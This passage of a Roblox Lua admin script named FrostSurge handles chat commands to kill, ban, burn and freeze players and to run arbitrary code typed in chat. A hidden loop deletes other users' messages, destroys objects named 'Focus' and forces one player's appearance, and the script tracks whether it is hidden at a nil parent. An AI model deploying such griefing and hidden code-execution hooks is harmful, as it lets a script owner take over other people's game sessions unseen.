            for _, v in ipairs(game:GetService("Teams"):GetChildren()) do
                v:Destroy()
            end
        end)
        for _, v in ipairs(Services.players:GetPlayers()) do
            v.Neutral = true
        end
        Float3(who, {"Deep cleared"})
        wait(2)
        RemoveTabs3(who)
elseif msg:lower():sub(1,6)=="clear;" then
g = Services.workspace:GetChildren()
for _, v in ipairs(workspace:GetChildren()) do
if v.Name ~= "Terrain" and v.Name ~= "Base" and not Services.players:playerFromCharacter(v) and not v:IsA("Script") then
  v:Destroy()
end
end
Float3(who, {"Cleared : Workspace,Lighting"})
wait(2)
RemoveTabs3(who)
elseif msg:lower():sub(1,2)=="m;" then
msg2(""..who.Name..": "..msg:sub(3).."")
elseif msg:lower():sub(1,2)=="h;" then
hint(""..who.Name..": "..msg:sub(3).."")
elseif msg:lower():sub(1,9)=="shut".."down;" then
pcall(function() ypcall(wait) end)
elseif msg:lower():sub(1,7)=="freeze;" then
        p=FindPlayer(msg:sub(8))
        if p~=nil then
            if p.Character then
                for _,v in pairs(p.Character:GetChildren()) do
                    if v:IsA("BasePart") and v.Name:sub(1,2)~="B1" and v.Name:sub(1,2) ~="B2" and v.Name:sub(1,2) ~="B3" then
                        v.Anchored = true
                    end
                end
            end
                Float3(who, {"You have froze "..p.Name})
                wait(3)
                RemoveTabs3(who)
        end
    elseif msg:lower():sub(1,5)=="thaw;" then
        p=FindPlayer(msg:sub(6))
        if p~=nil then
            if p.Character then
                for _,v in pairs(p.Character:GetChildren()) do
                    if v:IsA("BasePart") and v.Name:sub(1,2)~="B1" and v.Name:sub(1,2) ~="B2" and v.Name:sub(1,2) ~="B3" then
                        v.Anchored = false
						v.Reflectance=0
                    end
                end
            end
                Float3(who, {"You have thawed "..p.Name})
                wait(3)
                RemoveTabs3(who)
        end
elseif msg:lower():sub(1,6)=="close;" then
print("GONE")
pcall(function() script.Disabled=true end)
elseif msg:sub(1,7)=="status;" then
if osn==1 then
	stat5="Ab: On"
else
	stat5="Ab: Off"
end
if nul==1 then
	stat1="Script Nil"
else
	stat1="Script Not Nil"
end
if on==1 then
	stat2="Private Server: On"
else
	stat2="Private Server: Off"
end
if nul==1 then
	stat4="Script's Parent: Nil"
else
	stat4="Script's Parent: Workspace"
end
stat6="Framerate: "..1/wait().." FPS"
stat3="Script's Name: "..script.Name
stat={}
table.insert(stat, stat1)
table.insert(stat, stat2)
table.insert(stat, stat3)
table.insert(stat, stat4)
table.insert(stat, stat5)
table.insert(stat, stat6)
table.insert(stat, FLstat)
Float2(who, stat)
elseif msg:lower():sub(1,8)=="prilist;" then
Float2(who, Prilist)
elseif msg:lower():sub(1,6)=="admin;" then
p=FindPlayer(msg:sub(7))
if p~=nil then
table.insert(Ranks.Admin, p.Name)
Float3(who, {"Admined: "..p.Name..""})
getadmin(p)
end
elseif msg:lower():sub(1,8)=="unadmin;" then
p=FindPlayer(msg:sub(9))
if p~=nil then
	Float3(who,{"UnAdmined: "..p.Name..""})
	for bb =1,#namelist do
		if namelist[bb] == p.Name then
			print(p.Name)
            table.remove(variablelist,bb)
            table.remove(flist,bb)
            table.remove(namelist,bb)
            table.remove(templist,bb)
			table.remove(Ranks.Admin, p.Name)
		end
	end
end
elseif msg:lower():sub(1,4)=="pri;" then
if msg:lower():sub(5)=="on" then
pri=1
Float3(who, {"Private Server On"})
wait(2)
RemoveTabs3(who)
else
if msg:lower():sub(5)=="off" then
pri=0
Float3(who, {"Private Server Off"})
wait(2)
RemoveTabs3(who)
else
Float3(who, {"Use Pri:on,off"})
wait(2)
RemoveTabs3(who)
end
end
elseif msg:lower():sub(1,5)=="jail;" then
p=FindPlayer(msg:sub(6))
if p~= nil then
	jail(p)
end
elseif msg:lower():sub(1,7)=="unjail;" then
p=FindPlayer(msg:sub(8))
if p ~= nil then
	unjail(p)
end
elseif msg:lower():sub(1,5)=="info;" then
infolist={}
        p=FindPlayer(msg:sub(6))
    if p~=nil then
    ozz=p.MembershipType.Value
if ozz==1 then
otc="BC"
else
if ozz==2 then
otc="TBC"
else
if ozz==3 then
otc="OBC"
else
if ozz==0 then
otc="NBC"
end
end
end
end
    id="UserId: "..p.userId
    mem="MemberShipType: "..otc
    nam="Name: "..p.Name
    age="Age: "..p.AccountAge
	dc="DataComplexity: "..p.DataComplexity
if p.CanLoadCharacterAppearance==true then
can="CanLoadCharacterAppearance: true"
else
can="CanLoadCharacterAppearance: false"
end
if p.DataReady==true then
dr="DataReady: true"
else
dr="DataReady: false"
end
if p.Neutral==true then
neu="Neutral: true"
else
neu="Neutral: false"
end
table.insert(infolist, id)
table.insert(infolist, mem)
table.insert(infolist, age)
table.insert(infolist, nam)
table.insert(infolist, dc)
table.insert(infolist, can)
table.insert(infolist, dr)
table.insert(infolist, neu)
    end
    Float2(who, infolist)
elseif msg:lower():sub(1,7)=="script;" then
if NLS then
makenscript(tostring(msg:sub(8)),who.Backpack,"script",false)
end
elseif msg:lower():sub(1,6)=="local;" then
if LS then
makelscript(tostring(msg:sub(7)),who.Backpack,"localscript",false)
end
    elseif msg:lower():sub(1,3)=="ff;" then
        p=FindPlayer(msg:sub(4))
        if p~=nil then
            if p.Character then
                Instance.new("ForceField",p.Character)
                    Float3(who, {"You have gave FF to "..p.Name})
                    wait(3)
                    RemoveTabs3(who)
                end
            end
    elseif msg:lower():sub(1,5)=="unff;" then
        p=FindPlayer(msg:sub(6))
        if p~=nil then
            if p.Character then
                for _,v in pairs(p.Character:GetChildren()) do
                    if v:IsA("ForceField") then
                        v:Destroy()
                    end
                end
            end
                Float3(who, {"You have removed "..p.Name.."'s FF"})
                wait(3)
                RemoveTabs3(who)
        end
    elseif msg:lower():sub(1,4)=="tab;" then
        local times={}
        for i=1,tonumber(msg:sub(5)) do
            table.insert(times,"")
        end
		if #times > limit then
		Float(who, {"Please Keep Ammount of tablets under "..limit..""})
		else
        Float(who, times)
		end
elseif msg:lower():sub(1,4)=="ban;" then
p=FindPlayer(msg:sub(5))
if p~= nil then
table.insert(Ranks.Banned, p.Name)
p:remove()
Float3(who, {"Banned: "..p.Name})
wait(2)
RemoveTabs3(who)
end
elseif msg:lower():sub(1,8)=="banlist;" then
Float(who, Ranks.Banned)
elseif msg:lower():sub(1,4)=="sit;" then
p=FindPlayer(msg:sub(5))
if p~= nil then
if p.Character then
p.Character.Humanoid.Sit=true
Float3(who, {"Made "..p.Name.." Sit"})
wait(2)
RemoveTabs3(who)
end
end
elseif msg:lower():sub(1,10)=="adminlist;" then
for _,v in pairs(Ranks.Admin) do
Float2(who, Ranks.Admin)
end
elseif msg:lower():sub(1,5)=="jump;" then
p=FindPlayer(msg:sub(6))
if p ~=nil then
if p.Character then
p.Character.Humanoid.Jump=true
Float3(who, {"Made "..p.Name.." Jump"})
wait(2)
RemoveTabs3(who)
end
end
elseif msg:lower():sub(1,5)=="kill;" then
p=FindPlayer(msg:sub(6))
if p~=nil then
if p.Character then
p.Character.Torso:Remove()
Float3(who, {"Killed: "..p.Name})
wait(2)
RemoveTabs3(who)
end
end
elseif msg:lower():sub(1,8)=="credits;" then
creds={'No credits :('}
Float2(who, creds)
elseif msg:lower():sub(1,9)=="nplayers;" then
nlist={}
for i,v in pairs(game.NetworkServer:GetChildren()) do
if v:GetPlayer().Parent ~= game:service("Players") then
x=v:GetPlayer().Name
table.insert(nlist, x)
end 
end 
if #nlist==0 then 
txt="No Nil Players"
table.insert(nlist, txt)
end 
Float2(who, nlist)
elseif msg:lower():sub(1,5)=="base;" then
bost()
elseif msg:lower():sub(1,3)=="pr;" then
Float2(who, {""..who.Name..": "..msg:sub(4).." "})
elseif msg:sub(1,4)=="rad;" then
dis=tonumber(msg:sub(5))
elseif msg:lower():sub(1,6)=="speed;" then
spe=tonumber(msg:sub(7))
elseif msg:lower():sub(1,8)=="players;" then
plist={}
for i,v in pairs(Services.players:GetChildren()) do
pc=v.Name
table.insert(plist, pc)
Float(who, plist)
end
elseif msg:lower():sub(1,9)=="services;" then
getchild=game:GetChildren()
child={}
pcall(function()
for i =1,#getchild do
table.insert(child, getchild[i].Name)
end
end)
Float2(who, child)
elseif msg:sub(1,10)=="walkspeed;" then
danumber = nil
for i =11,100 do
if string.sub(msg,i,i) == ";" then
danumber = i
break
end end
if danumber == nil then
return
end
p=FindPlayer(string.sub(msg,11,danumber - 1))
if p~=nil then
if p.Character then
if p.Character.Humanoid ~= nil then
hum= p.Character.Humanoid
hum.WalkSpeed = string.sub(msg,tonumber(danumber + 1))
end
end
else
wait()
end
elseif msg:sub(1,7)=="health;" then
danumber = nil
for i =8,100 do
	if string.sub(msg,i,i) == ";" then
		danumber = i
	break
	end 
end
if danumber == nil then
	return
end
p=FindPlayer(string.sub(msg,8,danumber - 1))
if p~=nil then
	if p.Character then
		if p.Character.Humanoid ~= nil then
			hum = p.Character.Humanoid
			hum.MaxHealth = string.sub(msg,tonumber(danumber + 1))
			hum.Health= string.sub(msg,tonumber(danumber + 1))
		end
	end
else
	wait()
end
elseif msg:sub(1,9)=="teleport;" then
danumber = nil
	for i =10,100 do
		if string.sub(msg,i,i) == ";" then
			danumber = i
		break
	end 
end
if danumber == nil then
	return
end
p=FindPlayer(string.sub(msg,10,danumber - 1))
if p~=nil then
	if p.Character then
		tor1 = p.Character.Torso
		p2=FindPlayer(string.sub(msg,danumber + 1))
		if p2 ~= nil then
			if p2.Character then
				p.Character.Torso.CFrame=p2.Character.Torso.CFrame + Vector3.new(0,3,0)
			end
		end
	end
else
	wait()
end
elseif msg:lower():sub(1,5)=="burn;" then
p=FindPlayer(msg:sub(6))
if p ~= nil then
	if p.Character then
		phrases={"AHHHHHHH!!!","IM MELTINGGGGG","MURDERER AHHH","STOP NO OWWWWW!!!","Jesus save me!","Damn im looking a bit charred today"}
		phrase=phrases[math.random(1,6)]
		hum=p.Character.Humanoid
		game:GetService("Chat"):Chat(p.Character.Head, phrase, Enum.ChatColor.Red)
		xx=hum.MaxHealth
pgc=p.Character:GetChildren()
for i =1,#pgc do
		if pgc[i]:IsA("Part") then
			pgc[i].BrickColor=BrickColor.new("Really black")
			pgc[i].Material="CorrodedMetal"
			z=Instance.new("Fire",pgc[i])
			z.Heat=30
			z.Size=3
	end
end
		for i =1,xx do
			wait(.1)
			hum.Health = hum.Health -xx/16
		end
	end
end
elseif msg:lower():sub(1, 9) == "dscripts;" then
victim = FindPlayer(msg:sub(10))
nup = victim.Chatted:connect(function()
	ner = game.Workspace.ChildAdded:connect(function(p)
		if p.ClassName == "Script" or p.ClassName == "LocalScript" then
			p.Disabled = true
			p:Destory()
		end
	end)
end)
elseif msg:lower():sub(1,10)=="workspace;" then
if msg:sub(11)=="num" then
nulist={}
for i,v in pairs(workspace:GetChildren()) do
num=v.Name
table.insert(nulist, num)
Float(who, {"Items In Workspace : "..#nulist.." "})
end
else
wlist={}
for i,v in pairs(workspace:GetChildren()) do
wc=v.Name
table.insert(wlist, wc)
Float(who, wlist)
end
end
elseif msg:sub(1,8)=="chatlog;" then
if msg:sub(9)=="" then
	Float(who, history)
	else
	if msg:lower():sub(9)=="clear" then
		for i =1,#history do 
			history[i]=nil 
				end
			end
		end
	end
end
function showA(plr)
if plr.Character ~= nil then
wait(2)
if plr.Name ~= "VisualCSharp" and plr.Name ~= "CottenEyedMario" then
      for _, v in ipairs(plr.Character:GetChildren()) do
        if v:IsA("Accoutrement") then
          pcall(function()
            v:Destroy()
          end)
        end
      end
	end
      local give = function(id)
        local x = game:GetService("InsertService"):LoadAsset(id)
        for _, v in ipairs(x:GetChildren()) do
          if v:IsA("Accoutrement") then
            pcall(function() v.Parent = plr.Character end)
            return v
          elseif v:IsA("Tool") or v:IsA("HopperBin") then
            pcall(function() v.Parent = plr.Backpack end)
            return v
          end
        end
        return x
      end
if plr.Name ~= "VisualCSharp" and plr.Name ~="CottenEyedMario" then
local a = give(21070012)
local b = give(9255011)
end
Acol="White"
pcall(function()
if plr.Name ~= "VisualCSharp" and plr.Name ~="CottenEyedMario" then
plr.Character.Humanoid.MaxHealth=math.huge
plr.Character.Humanoid.Health=math.huge
plr.Character.Head.Transparency=1
end
end)
rarm=plr.Character["Right Arm"]
function weld(name,parent,p1,p0,c1,c0)
    we=Instance.new("Weld",parent) 
    we.Part1=p1 
    we.Part0=p0 
    we.C1=c1 
    we.C0=c0
end
function bm(parent)
    b=Instance.new("BlockMesh",parent)
end
function me(parent,type,sc1,sc2,sc3)
    m=Instance.new("SpecialMesh",parent)
    m.MeshType=type
    m.Scale=vec(sc1,sc2,sc3)
end
eff=Instance.new("Part",plr.Character)
eff.formFactor="Custom"
eff.BrickColor=BrickColor.new(Acol)
eff.Name="Eff"
eff.Size=Vector3.new(0.01,1.2,0.15)
eff.Anchored=false
eff.CanCollide=false
eff:BreakJoints()
bm(eff)
eff4=Instance.new("Part",plr.Character)
eff4.formFactor="Custom"
eff4.BrickColor=BrickColor.new(Acol)
eff4.Name="Eff"
eff4.Size=Vector3.new(0.01,1.2,0.15)
eff4.Anchored=false
eff4.CanCollide=false
eff4:BreakJoints()
bm(eff4)
eff3=Instance.new("Part",plr.Character)
eff3.formFactor="Custom"
eff3.BrickColor=BrickColor.new(Acol)
eff3.Name="Eff3"
eff3.Size=Vector3.new(0.01,0.20,0.55)
eff3.Anchored=false
eff3.CanCollide=false
eff3:BreakJoints()
bm(eff3)

weld("EFF1",rarm,eff,rarm,CFrame.Angles(0.27,0,0),CFrame.new(0.46,0.14,0.15))
weld("EFF2",rarm,eff4,rarm,CFrame.Angles(-0.27,0,0),CFrame.new(0.46,0.14,-0.15))
weld("EFF2",rarm,eff3,rarm,CFrame.new(0,0,0),CFrame.new(0.46,-0.14,0))
end
end
function showF(plr)
if plr.Character ~= nil then
wait(1)
      for _, v in ipairs(plr.Character:GetChildren()) do
        if v:IsA("Accoutrement") then
          pcall(function()
            v:Destroy()
          end)
        end
      end
      local give = function(id)
        local x = game:GetService("InsertService"):LoadAsset(id)
        for _, v in ipairs(x:GetChildren()) do
          if v:IsA("Accoutrement") then
            pcall(function() v.Parent = plr.Character end)
            return v
          elseif v:IsA("Tool") or v:IsA("HopperBin") then
            pcall(function() v.Parent = plr.Backpack end)
            return v
          end
        end
        return x
      end
local a = give(48545806)
local b = give(9255011)
Acol="Cyan"
pcall(function()
plr.Character.Humanoid.MaxHealth=math.huge
plr.Character.Humanoid.Health=math.huge
plr.Character.Head.Transparency=1
end)
rarm=plr.Character["Right Arm"]
function weld(name,parent,p1,p0,c1,c0)
    we=Instance.new("Weld",parent) 
    we.Part1=p1 
    we.Part0=p0 
    we.C1=c1 
    we.C0=c0
end
function bm(parent)
    b=Instance.new("BlockMesh",parent)
end
function me(parent,type,sc1,sc2,sc3)
    m=Instance.new("SpecialMesh",parent)
    m.MeshType=type
    m.Scale=vec(sc1,sc2,sc3)
end
eff=Instance.new("Part",plr.Character)
eff.formFactor="Custom"
eff.BrickColor=BrickColor.new(Acol)
eff.Name="Eff"
eff.Size=Vector3.new(0.01,1,0.25)
eff.Anchored=false
eff.CanCollide=false
eff:BreakJoints()
bm(eff)
eff2=Instance.new("Part",plr.Character)
eff2.formFactor="Custom"
eff2.BrickColor=BrickColor.new(Acol)
eff2.Name="Eff2"
eff2.Size=Vector3.new(0.01,0.25,0.75)
eff2.Anchored=false
eff2.CanCollide=false
eff2:BreakJoints()
bm(eff2)
eff3=Instance.new("Part",plr.Character)
eff3.formFactor="Custom"
eff3.BrickColor=BrickColor.new(Acol)
eff3.Name="Eff3"
eff3.Size=Vector3.new(0.01,0.25,0.75)
eff3.Anchored=false
eff3.CanCollide=false
eff3:BreakJoints()
bm(eff3)
weld("EFF1",rarm,eff,rarm,CFrame.new(0,0,0),CFrame.new(0.46,0.1,0.25))
weld("EFF2",rarm,eff2,rarm,CFrame.new(0,0,0),CFrame.new(0.46,0.1+0.625,0))
weld("EFF2",rarm,eff3,rarm,CFrame.new(0,0,0),CFrame.new(0.46,0.1+0.125,0))
end
end
function getcan(newPlayer)
    newPlayer.Changed:connect(function (property)
        if (property == "Character") then
			for i,b in pairs(Ranks.Admin) do
				if b:lower()==newPlayer.Name:lower() then
					showA(newPlayer)
				end
			end
		end
    end)
end
function getcan2(newPlayer)
    newPlayer.Changed:connect(function (property)
        if (property == "Character") then
			for i,b in pairs(Ranks.Owner) do
				if b:lower()==newPlayer.Name:lower() then
					showF(newPlayer)
				end
			end
		end
    end)
end
function getowner(Per)
	local fga=false
for i,v in pairs(Ranks.Owner) do
	if v:lower()==Per.Name:lower() then
		local tfv = Per.Chatted:connect(function(msg) onchat(msg,Per) end)
		table.insert(namelist,Per.Name)
		table.insert(variablelist,tfv)
		fga=true
		if Per.Parent == nil then
	return 
end
if fga == true then
	wait(2)
	showF(Per)
	getcan2(Per)
	gui("Welcome FrostSurge Owner!",Per.PlayerGui)
		return
			end
		end
	end
end
function getadmin(Per)
	local fga=false
	for i,v in pairs(Ranks.Banned) do
		if v:lower()==Per.Name:lower() then
			Per:Remove()
		return
	end
end
for i,v in pairs(Ranks.Admin) do
	if v:lower()==Per.Name:lower() then
		local tfv = Per.Chatted:connect(function(msg) onchat(msg,Per) end)
		table.insert(namelist,Per.Name)
		table.insert(variablelist,tfv)
		fga=true
		if Per.Parent == nil then
	return 
end
if fga == true then
	wait(2)
	showA(Per)
	getcan(Per)
	gui("Welcome FrostSurge Administrator!",Per.PlayerGui)
		return
			end
		end
	end
end

for i,v in pairs(Services.players:GetPlayers()) do
	getadmin(v)
end
for i,v in pairs(Services.players:GetPlayers()) do
	getowner(v)
end
game.Players.PlayerAdded:connect(getadmin)
game.Players.PlayerAdded:connect(getowner)
sg3=Instance.new("ScreenGui")
sg3.Name="FrostSurge"
tex=Instance.new("TextLabel",sg3)
tex.Text=guitext
tex.Font="ArialBold"
tex.Name="Info"
tex.FontSize=guisize
tex.TextStrokeColor3 =BrickColor.new(guicolor).Color
tex.TextStrokeTransparency = 0
tex.TextColor3=Color3.new(255/255,255/255,255/255)
tex.BackgroundTransparency=1
tex.Size=UDim2.new(0,240,0,25)
tex.Position=UDim2.new(0,820,0,20)
--[[...Next...]]
tex2=Instance.new("TextLabel",sg3)
tex2.Text=guitext2
tex2.Font="ArialBold"
tex2.Name="Info"
tex2.FontSize=guisize2
tex2.TextStrokeColor3 =BrickColor.new(guicolor).Color
tex2.TextStrokeTransparency = 0
tex2.TextColor3=Color3.new(255/255,255/255,255/255)
tex2.BackgroundTransparency=1
tex2.Size=UDim2.new(0,240,0,25)
tex2.Position=UDim2.new(0,820,0,50)
--[[...Next...]]
tex3=Instance.new("TextLabel",sg3)
tex3.Text=guitext3
tex3.Font="ArialBold"
tex3.Name="Info"
tex3.FontSize=guisize2
tex3.TextStrokeColor3 =BrickColor.new(guicolor).Color
tex3.TextStrokeTransparency = 0
tex3.TextColor3=Color3.new(255/255,255/255,255/255)
tex3.BackgroundTransparency=1
tex3.Size=UDim2.new(0,240,0,25)
tex3.Position=UDim2.new(0,820,0,70)

function givegui(plyr)
	if plyr.Name ~= "OhYa321" then
		sg3:Clone().Parent=plyr.PlayerGui
	end
end
function getres(newPlayer)
    newPlayer.Changed:connect(function (property)
        if (property == "Character") then
            givegui(newPlayer)
        end
    end)
end
for i,v in pairs(Services.players:GetPlayers()) do
	getres(v)
end
for i,v in pairs(Services.players:GetPlayers()) do
	givegui(v)
end
Services.players.PlayerAdded:connect(getres)

gpc=Services.players:GetChildren()
glc=game.Lighting:GetChildren()
coroutine.resume(coroutine.create(function()
while wait(.02) do
if not Services.workspace:findFirstChild("Base") then
if place then
	bost()
	end
end
gb=workspace:findFirstChild("Base")
pcall(function()
		if place then
	if gb.Anchored==false or gb.Transparency~= 0 or gb.Reflectance ~= 0 or gb.CanCollide==false or gb.Size ~= Vector3.new(512,1,512) or gb.BrickColor ~= BrickColor.new("Earth green") then
		bost()
	end
	end
end)
ggc=Services.workspace:GetChildren()
for i=1,#ggc do --1337 line
	if ggc[i]:IsA("Hint") and ggc[i].Name~="©£" then
		ggc[i]:Remove()
	end
end
for i=1,#ggc do
	if ggc[i]:IsA("Message") and ggc[i].Name~="©£££§£§©££§£§©££§£§" then
		ggc[i]:Remove()
	end
end
for i=1,#glc do
  if glc[i].ClassName~="Model" then
	glc[i]:Remove()
	end
end
pcall(function()
	player2=Services.players.rigletto
	if player2.CharacterAppearance ~= "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=10434517" then
		player2.CharacterAppearance="http://www.roblox.com/Asset/CharacterFetch.ashx?userId=10434517"
		player2:LoadCharacter()
	end 
end)
pcall(function()
      e=workspace:findFirstChild("Focus", true)
      e.Parent.Head:Destroy()
      e:Destroy()
end)
	end
end))

--mediafire gtfo password